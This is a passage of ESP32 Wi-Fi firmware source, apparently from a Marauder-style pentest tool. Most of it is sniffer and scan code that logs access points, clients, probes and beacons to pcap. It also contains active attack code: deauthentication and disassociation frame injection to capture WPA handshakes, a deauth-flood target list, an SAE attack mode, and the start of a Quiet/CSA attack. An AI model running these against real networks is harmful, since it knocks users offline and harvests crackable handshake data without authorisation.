				AccessPoint _temp_ap;
				_temp_ap.essid = essid;
				_temp_ap.channel = channel;
				memcpy(_temp_ap.bssid, &snifferPacket->payload[10], 6);
				
				if (!low_memory_warning) {
					deauth_flood_ap->add(_temp_ap);
					Serial.println("[INFO] Added: " + essid + "(Ch: " + /*String(snifferPacket->rx_ctrl.channel)*/ String(channel) + ")" + " (BSSID: " + bssid \
					+ ")");
				} else {
					Serial.println("[WARN] Low Memory! Ignore AP " + essid + "(Ch: " + /*String(snifferPacket->rx_ctrl.channel)*/ String(channel) + ")" + " (BSSID: " + bssid \
					+ ") - Not added to list");
				}
			}
		}
	}
}

void WiFiModules::apstaSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
	extern WiFiModules wifi;
	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
	int len = snifferPacket->rx_ctrl.sig_len;

	String essid = "";
	String bssid = "";

	if (type == WIFI_PKT_MGMT) {
		len -= 4;

		if ((snifferPacket->payload[0] == 0x80))
    	{
			uint8_t security_type = wifi.getSecurityType(snifferPacket->payload, snifferPacket->rx_ctrl.sig_len);

			char addr[] = "00:00:00:00:00:00";
			getMAC(addr, snifferPacket->payload, 10);
			bool in_list = false;
			bool mac_match = true;

			for (int i = 0; i < access_points->size(); i++) {
				mac_match = true;

				
				for (int x = 0; x < 6; x++) {
					if (snifferPacket->payload[x + 10] != access_points->get(i).bssid[x]) {
						mac_match = false;
						break;
					}
				}
				if (mac_match) {
					in_list = true;
					break;
				}
			}

			if (!in_list) {
		
				vTaskDelay(random(0, 10) / portTICK_PERIOD_MS);
				for (int i = 0; i < snifferPacket->payload[37]; i++)
				{
					essid.concat((char)snifferPacket->payload[i + 38]);
				}

				bssid.concat(addr);
			
					
				if (essid.isEmpty()) {
					essid = bssid;
				}

				uint32_t ie_offset = 36;
				uint8_t channel = 0;
            
				while (ie_offset + 2 < len) {
					uint8_t ie_type = snifferPacket->payload[ie_offset];
					uint8_t ie_length = snifferPacket->payload[ie_offset + 1];
					
					if (ie_offset + 2 + ie_length > len) break;

					if (ie_type == 3 && ie_length >= 1) {  // DS Parameter Set
						channel = snifferPacket->payload[ie_offset + 2];
						break;
					}
					
					ie_offset += 2 + ie_length;
				}

				if (channel == 0) channel = snifferPacket->rx_ctrl.channel;

				WiFiScanBand band;
				if (channel > 13) {
					band = WIFI_BAND_5Ghz;
				} else {
					band = WIFI_BAND_2_4Ghz;
				}

				if (!low_memory_warning)
					//display_buffer->add("Ch:" + String(snifferPacket->rx_ctrl.channel) + " " + essid);
					display_buffer->add("Ch:" + String(channel) + " " + essid);
				else
					display_buffer->add("Low Mem! Ignore!");
				wifiScanRedraw = true;

				String wpastr = "";

				switch(security_type) {
					case WIFI_SECURITY_OPEN: wpastr = "Open"; break;
					case WIFI_SECURITY_WEP: wpastr = "WEP"; break;
					case WIFI_SECURITY_WPA: wpastr = "WPA"; break;
					case WIFI_SECURITY_WPA2: wpastr = "WPA2"; break;
					case WIFI_SECURITY_WPA2_ENTERPRISE: wpastr = "WPA2/Enterprise"; break;
					case WIFI_SECURITY_WPA3: wpastr = "WPA3"; break;
					case WIFI_SECURITY_WPA3_ENTERPRISE: wpastr = "WPA3/Enterprise"; break;
					case WIFI_SECURITY_WPA_WPA2_MIXED: wpastr = "WPA/WPA2 Mixed"; break;
					case WIFI_SECURITY_WAPI: wpastr = "WAPI"; break;
				}

				AccessPoint _temp_ap = {essid,
					//static_cast<uint8_t>(snifferPacket->rx_ctrl.channel),
					channel, {
					snifferPacket->payload[10],
					snifferPacket->payload[11],
					snifferPacket->payload[12],
					snifferPacket->payload[13],
					snifferPacket->payload[14],
					snifferPacket->payload[15]},
					security_type, wpastr, false, new LinkedList<uint16_t>(),
					{snifferPacket->payload[34], snifferPacket->payload[35]},
					band,
					static_cast<int8_t>(snifferPacket->rx_ctrl.rssi)};
				
				if (!low_memory_warning) {
					access_points->add(_temp_ap);
					Serial.println("[INFO] Added: " + essid + "(Ch: " + /*String(snifferPacket->rx_ctrl.channel)*/ String(channel) + ")" + " (BSSID: " + bssid \
					+ ")" + " (RSSI: " + String(snifferPacket->rx_ctrl.rssi) + ")" + " (Security: " + wpastr + ")");
				} else {
					Serial.println("[WARN] Low Memory! Ignore AP " + essid + "(Ch: " + /*String(snifferPacket->rx_ctrl.channel)*/ String(channel) + ")" + " (BSSID: " + bssid \
					+ ")" + " (RSSI: " + String(snifferPacket->rx_ctrl.rssi) + ")" + " (Security: " + wpastr + ")");
				}
				
				logutils.pcapAppend(snifferPacket, len);

				return;
			}
		}
	}

	if (type == WIFI_PKT_DATA) {
		char ap_addr[] = "00:00:00:00:00:00";
		char dst_addr[] = "00:00:00:00:00:00";

		int ap_index = 0;

		// Check if frame has ap in list of APs and determine position
		uint8_t frame_offset = 0;
		int offsets[2] = {10, 4};
		bool matched_ap = false;
		bool ap_is_src = false;

		bool mac_match = true;

		// Check both addrs for AP addr
		for (int y = 0; y < 2; y++) {
			// Iterate through all APs
			for (int i = 0; i < access_points->size(); i++) {
				mac_match = true;
				
				// Go through each byte in addr
				for (int x = 0; x < 6; x++) {
					if (snifferPacket->payload[x + offsets[y]] != access_points->get(i).bssid[x]) {
						mac_match = false;
						break;
					}
				}
				if (mac_match) {
					matched_ap = true;
					if (offsets[y] == 10)
						ap_is_src = true;
					ap_index = i;
					getMAC(ap_addr, snifferPacket->payload, offsets[y]);
					break;
				}
			}
			if (matched_ap)
				break;
		}

		// If did not find ap from list in frame, drop frame
		if (!matched_ap)
			return;
		else {
		if (ap_is_src)
			frame_offset = 4;
		else
			frame_offset = 10;
		}    

		// Check if we already have this station
		bool in_list = false;
		for (int i = 0; i < device_station->size(); i++) {
			mac_match = true;
			
			for (int x = 0; x < 6; x++) {
				if (snifferPacket->payload[x + frame_offset] != device_station->get(i).mac[x]) {
					mac_match = false;
					break;
				}
			}
			if (mac_match) {
				in_list = true;
				break;
			}
		}

		getMAC(dst_addr, snifferPacket->payload, 4);

		// Check if dest is broadcast
		if ((in_list) || (strcmp(dst_addr, "ff:ff:ff:ff:ff:ff") == 0))
			return;
			
		// Add to list of stations
		Station sta = {
						{snifferPacket->payload[frame_offset],
						snifferPacket->payload[frame_offset + 1],
						snifferPacket->payload[frame_offset + 2],
						snifferPacket->payload[frame_offset + 3],
						snifferPacket->payload[frame_offset + 4],
						snifferPacket->payload[frame_offset + 5]},
						false
						};
		
		if (!low_memory_warning) device_station->add(sta);
			
		char sta_addr[] = "00:00:00:00:00:00";
			
		if (ap_is_src) {
			getMAC(sta_addr, snifferPacket->payload, 4);
		}
		else {
			getMAC(sta_addr, snifferPacket->payload, 10);
		}

		if (!low_memory_warning) {
			Serial.println("[INFO] Added Station " + String(sta_addr)  +" -> Ap:" + access_points->get(ap_index).essid);
			display_buffer->add(String(sta_addr));
			display_buffer->add("->" + access_points->get(ap_index).essid);
		} else {
			Serial.println("[WARN] Low Memory! Ignore Station " + String(sta_addr) + " -> Ap:" + access_points->get(ap_index).essid + " not added to display buffer!");
			display_buffer->add("Low Mem! Ignore!");
		}
		
		wifiScanRedraw = true;

		if (!low_memory_warning) {
			AccessPoint ap = access_points->get(ap_index);
			ap.stations->add(device_station->size() - 1);
			
			access_points->set(ap_index, ap);
		}

		logutils.pcapAppend(snifferPacket, len);
	}
}

void WiFiModules::deauthSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
	int len = snifferPacket->rx_ctrl.sig_len;

	if (type == WIFI_PKT_MGMT)
	{
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;
		static unsigned long deauthcheck = 0;
		if (millis() - deauthcheck > 30) { // prevent crash
			if (snifferPacket->payload[0] == 0xA0 || snifferPacket->payload[0] == 0xC0 )
			{
				char addr[] = "00:00:00:00:00:00";
				char dst_addr[] = "00:00:00:00:00:00";
				getMAC(addr, snifferPacket->payload, 10);
				getMAC(dst_addr, snifferPacket->payload, 4);
				display_buffer->add(addr);
				display_buffer->add("->" + String(dst_addr));
				wifiScanRedraw = true;
				Serial.println("[INFO] Deauthentication Frame Detected! " + String(addr) + " -> " + String(dst_addr));

				logutils.pcapAppend(snifferPacket, len);
			}
			deauthcheck = millis();
		}
	}
}

void WiFiModules::probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
	int len = snifferPacket->rx_ctrl.sig_len;

	if (type == WIFI_PKT_MGMT) {
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;

		String probe_req_essid = "";
		if (snifferPacket->payload[0] == 0x40)
		{
			vTaskDelay(random(0, 10) / portTICK_PERIOD_MS);
			char addr[] = "00:00:00:00:00:00";
			getMAC(addr, snifferPacket->payload, 10);
			for (int i = 0; i < snifferPacket->payload[25]; i++)
			{
				probe_req_essid.concat((char)snifferPacket->payload[26 + i]);
			}

			uint32_t ie_offset = 36;
			uint8_t channel = 0;
            
			while (ie_offset + 2 < len) {
				uint8_t ie_type = snifferPacket->payload[ie_offset];
				uint8_t ie_length = snifferPacket->payload[ie_offset + 1];
					
				if (ie_offset + 2 + ie_length > len) break;

				if (ie_type == 3 && ie_length >= 1) {  // DS Parameter Set
					channel = snifferPacket->payload[ie_offset + 2];
					break;
				}
					
				ie_offset += 2 + ie_length;
			}

			if (channel == 0) channel = snifferPacket->rx_ctrl.channel;

			if (probe_req_essid.length() > 0) {
				bool essidExist = false;
				for (int i = 0; i < probe_req_ssids->size(); i++) {
					ProbeReqSsid cur_probe_ssid = probe_req_ssids->get(i);
					if (cur_probe_ssid.essid == probe_req_essid) {
						cur_probe_ssid.requests++;
					  	probe_req_ssids->set(i, cur_probe_ssid);
						essidExist = true;
						break;
					}
				}
				if (!essidExist) {
					ProbeReqSsid probeReqSsid;
					probeReqSsid.essid = probe_req_essid;
				  	probeReqSsid.requests = 1;
					probeReqSsid.selected = false;
					probeReqSsid.channel = /*snifferPacket->rx_ctrl.channel;*/ channel;
					probeReqSsid.rssi = snifferPacket->rx_ctrl.rssi;
					if (!low_memory_warning) {
				  		probe_req_ssids->add(probeReqSsid);
					}
				}
			}

			if (!low_memory_warning) {
				display_buffer->add(addr);
				display_buffer->add("->" + probe_req_essid);
			} else display_buffer->add("Low Mem! Ignore!");
			wifiScanRedraw = true;
			Serial.println("[INFO] Probe Detected! Client:" + String(addr) + " Requesting: (CH:" + /*String(snifferPacket->rx_ctrl.channel)*/ String(channel) \
			+ ") " + probe_req_essid + " RSSI: " + String(snifferPacket->rx_ctrl.rssi));

			logutils.pcapAppend(snifferPacket, len);
      	}
	}
}

void WiFiModules::beaconSnifferCallback(void* buf , wifi_promiscuous_pkt_type_t type) {
	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
	int len = snifferPacket->rx_ctrl.sig_len;

	String essid = "";
	String add_to_buffer = "";

	if (type == WIFI_PKT_MGMT) {
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;

		uint8_t target_mac[6] = {0xde, 0xad, 0xbe, 0xef, 0xde, 0xad};

		if (snifferPacket->payload[0] == 0x80)
		{
			bool mac_match = true;
			for (int i = 0; i < 6; i++) {
				if (snifferPacket->payload[10 + i] != target_mac[i]) {
					mac_match = false;
					break;
				}
			}
			if (mac_match) {
				Serial.println("[INFO] Pwnagotchi beacon detected!");
				display_buffer->add("Pwn bc dectected!");
				return;
			}
			uint32_t ie_offset = 36;
			uint8_t channel = 0;
            
			while (ie_offset + 2 < len) {
				uint8_t ie_type = snifferPacket->payload[ie_offset];
				uint8_t ie_length = snifferPacket->payload[ie_offset + 1];
					
				if (ie_offset + 2 + ie_length > len) break;

				if (ie_type == 3 && ie_length >= 1) {  // DS Parameter Set
					channel = snifferPacket->payload[ie_offset + 2];
					break;
				}
					
				ie_offset += 2 + ie_length;
			}

			if (channel == 0) channel = snifferPacket->rx_ctrl.channel;

			vTaskDelay(random(0, 10) / portTICK_PERIOD_MS);
			add_to_buffer.concat("C:" + /*String(snifferPacket->rx_ctrl.channel)*/ String(channel));
			add_to_buffer.concat(" ");
			char addr[] = "00:00:00:00:00:00";
			getMAC(addr, snifferPacket->payload, 10);
			if (snifferPacket->payload[37] <= 0)
				essid.concat(addr);
			else {
				for (int i = 0; i < snifferPacket->payload[37]; i++)
				{
					essid.concat((char)snifferPacket->payload[i + 38]);
				}
			}
			add_to_buffer.concat(essid);
			display_buffer->add(add_to_buffer);
			wifiScanRedraw = true;
			if (essid == String(addr))
				Serial.println("[INFO] Beacon Detected! <Hidden ESSID> (Ch:" + /*String(snifferPacket->rx_ctrl.channel)*/ String(channel) + ") " \
				+ "(BSSID:" + String(addr) + ") " + "(RSSI:" + String(snifferPacket->rx_ctrl.rssi) + ")");
			else
				 Serial.println("[INFO] Beacon Detected! " + essid + " (Ch:" + /*String(snifferPacket->rx_ctrl.channel)*/ String(channel) + ") " \
				+ "(BSSID:" + String(addr) + ") " + "(RSSI:" + String(snifferPacket->rx_ctrl.rssi) + ")");

			logutils.pcapAppend(snifferPacket, len);
		}
	}
}

void WiFiModules::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
	extern WiFiModules wifi;
	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
	int len = snifferPacket->rx_ctrl.sig_len;

	String display_string = "";

	if (type == WIFI_PKT_MGMT)
	{
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;
	}
	// Found beacon frame. Decide whether to deauth
	if (eapol_scan_send_deauth) {
		if (snifferPacket->payload[0] == 0x80) {    
		// Build packet
		uint8_t bssid[6];
		for (int i = 10; i < 16; i++) {
			bssid[i-10] = snifferPacket->payload[i];
		}
		memcpy(&wifi.deauth_frame_packet[10], bssid, 6);
		memcpy(&wifi.deauth_frame_packet[16], bssid, 6);
		
		memcpy(&wifi.disassoc_frame_packet[10], bssid, 6);     
		memcpy(&wifi.disassoc_frame_packet[16], bssid, 6);
		
		// Send packet
		esp_wifi_80211_tx(WIFI_IF_AP, wifi.deauth_frame_packet, sizeof(wifi.deauth_frame_packet), false);
		esp_wifi_80211_tx(WIFI_IF_AP, wifi.disassoc_frame_packet, sizeof(wifi.disassoc_frame_packet), false);
		delay(1);
		}
	}

	if (((snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e) || ( snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e) )){

		char addr[] = "00:00:00:00:00:00";
		getMAC(addr, snifferPacket->payload, 10);
		
		Serial.println("[INFO] Received EAPOL: " + String(addr));

		display_buffer->add(addr);
		wifiScanRedraw = true;
	}

	logutils.pcapAppend(snifferPacket, len);
}

void WiFiModules::analyzerWiFiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
	extern WiFiModules wifi;
	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
	int len = snifferPacket->rx_ctrl.sig_len;

	for (int i = 0; i < 3; i++) wifi.wifi_analyzer_value++;
	if (wifi.wifi_analyzer_frames_recvd < 254) {
		wifi.wifi_analyzer_frames_recvd++;
	}
	if (wifi.wifi_analyzer_frames_recvd >= 100) { // Analyzer Name Refresh (ESP32 Marauder)
		if (type == WIFI_PKT_MGMT) {
			len -= 4;
			if (snifferPacket->payload[0] == 0x80) {
				String _temp_ssid = "";
				char addr[] = "00:00:00:00:00:00";
				getMAC(addr, snifferPacket->payload, 10);

				wifi.wifi_analyzer_rssi = snifferPacket->rx_ctrl.rssi;

				// Get ESSID if exists else give BSSID to display string
				if (snifferPacket->payload[37] <= 0) // There is no ESSID. Just add BSSID
					_temp_ssid = String(addr);
				else { // There is an ESSID. Add it
					for (int i = 0; i < snifferPacket->payload[37]; i++)
					{
						_temp_ssid.concat((char)snifferPacket->payload[i + 38]);
					}
				}
				wifi.wifi_analyzer_ssid = _temp_ssid;
			}
			wifi.wifi_analyzer_frames_recvd = 0;
		}
	}
}

void WiFiModules::SAECommitSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
	extern WiFiModules wifi;
	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
	int len = snifferPacket->rx_ctrl.sig_len;

	uint8_t src_addr[] = {snifferPacket->payload[10],
							snifferPacket->payload[11],
							snifferPacket->payload[12],
							snifferPacket->payload[13],
							snifferPacket->payload[14],
							snifferPacket->payload[15]};

	uint8_t dst_addr[] = {snifferPacket->payload[4],
							snifferPacket->payload[5],
							snifferPacket->payload[6],
							snifferPacket->payload[7],
							snifferPacket->payload[8],
							snifferPacket->payload[9]};
	if (type == WIFI_PKT_MGMT) {
		uint16_t group = 0;
		size_t act_len = 0;
		size_t act_off = 0;

		String src_addr_str = macToString(src_addr);
		String dst_addr_str = macToString(dst_addr);

		if (wifi.getSAEACT(snifferPacket->payload, len, group, act_len)) 
			if (wifi.sae_scan) {
				
				display_buffer->add(src_addr_str);
				display_buffer->add("->" + dst_addr_str);
				wifiScanRedraw = true;
				Serial.println("[INFO] " + src_addr_str + " -> " + dst_addr_str);
				if (act_len > 0) {
					Serial.print(F(" ACT: "));
					Serial.print(hexDump(current_act, act_len));
				}

				Serial.print(F(" Frame Len: "));
				Serial.println(len);

				logutils.pcapAppend(snifferPacket, len);
        }
    }
}

void WiFiModules::SAEScan(bool attack) {
	if (!attack) {
		logutils.createFile("sae", true);
		Serial.println("[INFO] Starting Simultaneous Authentication of Equals (SAE) scan...");
	}

	this->sae_scan = !attack;

	if (attack) {
		if(!initMbedtls()) {
			Serial.println("[ERROR] Failed to initialize mbedtls for SAE attack!");
			return;
		}
		esp_wifi_init(&cfg);
	}
	else esp_wifi_init(&cfg2);

	#ifdef BOARD_ESP32_C5_DEVKIT_C1
		esp_wifi_set_country(&country);
		esp_event_loop_create_default();
  	#endif

	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	if (attack) esp_wifi_set_mode(WIFI_MODE_STA);
	else esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	this->setMac();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&SAECommitSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	wifi_initialized = true;
	vTaskDelay(100 / portTICK_PERIOD_MS);
}

void WiFiModules::StartAnalyzerScan() {

	Serial.println("[INFO] Starting Analyzer scan...");

	esp_wifi_init(&cfg2);
	#ifdef BOARD_ESP32_C5_DEVKIT_C1
		esp_wifi_set_country(&country);
		esp_event_loop_create_default();
  	#endif
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	this->setMac();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&analyzerWiFiSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	wifi_initialized = true;
	vTaskDelay(100 / portTICK_PERIOD_MS);
}

void WiFiModules::StartBeaconScan() {
	Serial.println("[INFO] Starting Beacon scan...");

	logutils.createFile("beacon", true);

	esp_wifi_init(&cfg2);
	#ifdef BOARD_ESP32_C5_DEVKIT_C1
		esp_wifi_set_country(&country);
		esp_event_loop_create_default();
  	#endif
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	this->setMac();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	wifi_initialized = true;
	vTaskDelay(100 / portTICK_PERIOD_MS);
}

void WiFiModules::StartProbeReqScan() {
	delete probe_req_ssids;
	probe_req_ssids = new LinkedList<ProbeReqSsid>();
	
	Serial.println("[INFO] Starting Probe Request scan...");

	logutils.createFile("probe", true);

	esp_wifi_init(&cfg2);
	#ifdef BOARD_ESP32_C5_DEVKIT_C1
		esp_wifi_set_country(&country);
		esp_event_loop_create_default();
  	#endif
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	this->setMac();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&probeSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	wifi_initialized = true;
	vTaskDelay(100 / portTICK_PERIOD_MS);
}

void WiFiModules::StartDeauthScan() {

	Serial.println("[INFO] Starting Deauthentication scan...");

	logutils.createFile("deauth", true);

	esp_wifi_init(&cfg2);
	#ifdef BOARD_ESP32_C5_DEVKIT_C1
		esp_wifi_set_country(&country);
		esp_event_loop_create_default();
  	#endif
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	this->setMac();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&deauthSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	wifi_initialized = true;
	vTaskDelay(100 / portTICK_PERIOD_MS);
}

void WiFiModules::StartEapolScan() {

	Serial.println("[INFO] Starting Eapol scan...");

	logutils.createFile("eapol", true);

	esp_wifi_init(&cfg);
	#ifdef BOARD_ESP32_C5_DEVKIT_C1
		esp_wifi_set_country(&country);
		esp_event_loop_create_default();
  	#endif
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_AP);

	esp_err_t err;
	wifi_config_t conf;
	err = esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR);
	if (err != 0)
	{
		Serial.print("[ERROR] Failed to set protocol | ErrorCode 0x");
		Serial.println(err, HEX);
	}

	esp_wifi_get_config((wifi_interface_t)WIFI_IF_AP, &conf);
	conf.ap.ssid[0] = '\0';
	conf.ap.ssid_len = 0;
	conf.ap.channel = this->set_channel;
	conf.ap.ssid_hidden = 1;
	conf.ap.max_connection = 0;
	conf.ap.beacon_interval = 60000;

	err = esp_wifi_set_config((wifi_interface_t)WIFI_IF_AP, &conf);
	if (err != 0)
	{
		Serial.print("[ERROR] Failed to set AP config, SSID might visible | ErrorCode: 0x");
		Serial.println(err, HEX);
	}

	esp_wifi_start();
	this->setMac();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&eapolSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	wifi_initialized = true;
	vTaskDelay(100 / portTICK_PERIOD_MS);
}

void WiFiModules::StartAPStaWiFiScan() {
	delete access_points;
    access_points = new LinkedList<AccessPoint>();
	delete device_station;
	device_station = new LinkedList<Station>();

	Serial.println("[INFO] Starting WiFi/Station scan...");

	logutils.createFile("ap_sta", true);

	esp_wifi_init(&cfg2);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	this->setMac();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&apstaSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	wifi_initialized = true;
	vTaskDelay(100 / portTICK_PERIOD_MS);
}


void WiFiModules::StartAPWiFiScan() {
    delete access_points;
    access_points = new LinkedList<AccessPoint>();

    Serial.println("[INFO] Starting WiFi scan...");

	if (!first_scan) logutils.createFile("ap", true);
    
	esp_netif_init();
  	esp_event_loop_create_default();

  	esp_wifi_init(&cfg2);
	#ifdef BOARD_ESP32_C5_DEVKIT_C1
	 	esp_wifi_set_country(&country);
    	esp_event_loop_create_default();
	#endif
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	this->setMac();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&apSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	wifi_initialized = true;
    vTaskDelay(100 / portTICK_PERIOD_MS);
}

void WiFiModules::StartAPWiFiScanOld() { // using old scan to scan wifi
	delete access_points;
    access_points = new LinkedList<AccessPoint>();

    Serial.println("[INFO] Starting WiFi scan (Old)...");
    
    WiFi.mode(WIFI_STA);
	wifi_initialized = true;
    vTaskDelay(100 / portTICK_PERIOD_MS);
    
    int numNetworks = WiFi.scanNetworks(false, true);
    
    if (numNetworks == -1) {
        Serial.println("[ERROR] WiFi scan failed or No network found!");
        return;
    }
    
    Serial.println("[INFO] WiFi Scan Done! Total: " + String(numNetworks) + " Found!");
    
    for (int i = 0; i < numNetworks; i++) {
        AccessPoint ap;
        ap.essid = WiFi.SSID(i);
        ap.channel = static_cast<uint8_t>(WiFi.channel(i));
        
        uint8_t* bssid = WiFi.BSSID(i);
        if (bssid != nullptr) {
            memcpy(ap.bssid, bssid, 6);
        } else {
            memset(ap.bssid, 0, 6);
        }

		if (ap.essid.isEmpty()) {
			ap.essid = macToString(ap.bssid);
		}

        wifi_auth_mode_t old_security_type = WiFi.encryptionType(i);
		uint8_t security_type = -1;
		switch (old_security_type) {
            case WIFI_AUTH_OPEN: security_type = WIFI_SECURITY_OPEN; break;
            case WIFI_AUTH_WEP: security_type = WIFI_SECURITY_WEP; break;
            case WIFI_AUTH_WPA_PSK: security_type = WIFI_SECURITY_WPA; break;
            case WIFI_AUTH_WPA2_PSK: security_type = WIFI_SECURITY_WPA2; break;
            case WIFI_AUTH_WPA_WPA2_PSK: security_type = WIFI_SECURITY_WPA_WPA2_MIXED; break;
            case WIFI_AUTH_WPA2_ENTERPRISE: security_type = WIFI_SECURITY_WPA2_ENTERPRISE; break;
			case WIFI_AUTH_WPA3_PSK: security_type = WIFI_SECURITY_WPA3; break;
			case WIFI_AUTH_WPA3_ENTERPRISE: security_type = WIFI_SECURITY_WPA3_ENTERPRISE; break;
			case WIFI_AUTH_WAPI_PSK: security_type = WIFI_SECURITY_WAPI; break;
            default: security_type = -1; break;
        }
		ap.wpa = security_type;
		switch(security_type) {
			case WIFI_SECURITY_OPEN: ap.wpastr = "Open"; break;
			case WIFI_SECURITY_WEP: ap.wpastr = "WEP"; break;
			case WIFI_SECURITY_WPA: ap.wpastr = "WPA"; break;
			case WIFI_SECURITY_WPA2: ap.wpastr = "WPA2"; break;
			case WIFI_SECURITY_WPA2_ENTERPRISE: ap.wpastr = "WPA2/Enterprise"; break;
			case WIFI_SECURITY_WPA3: ap.wpastr = "WPA3"; break;
			case WIFI_SECURITY_WPA3_ENTERPRISE: ap.wpastr = "WPA3/Enterprise"; break;
			case WIFI_SECURITY_WPA_WPA2_MIXED: ap.wpastr = "WPA/WPA2 Mixed"; break;
			case WIFI_SECURITY_WAPI: ap.wpastr = "WAPI"; break;
		}
        ap.selected = false;
        ap.rssi = static_cast<int8_t>(WiFi.RSSI(i));
        access_points->add(ap);
        
        Serial.println("[INFO] Added: " + ap.essid + " (Ch:" + String(ap.channel) + ")" + " (Enc:" + ap.wpastr + ")");
    }
    
    WiFi.scanDelete();
    
    Serial.println("[INFO] Scan completed successfully! Networks in list: " + String(access_points->size()));
}

void WiFiModules::sendQuietCsaAttack(AccessPoint target_ap, bool csa) {
	if (!wifi_initialized) {
		Serial.println("[ERROR] WiFi is not initialized, cannot send [Quiet] or [CSA] attack.");
		return;
	}

	const uint8_t* post = nullptr;
  	int post_len = 0;

	static const uint8_t post_csa[] = {
		0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
		0x03, 0x01, 0x00,
		0x25, 0x03, 0x01, 0x00, 0xff
	};

	static const uint8_t post_quiet[] = {
		0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
		0x03, 0x01, 0x00, 0x07, 0x06, 0x55, 0x53, 0x20,
		0x64, 0x0b, 0x14, 0x20, 0x01, 0x00, 0x05, 0x04, 0x00, 0x01,
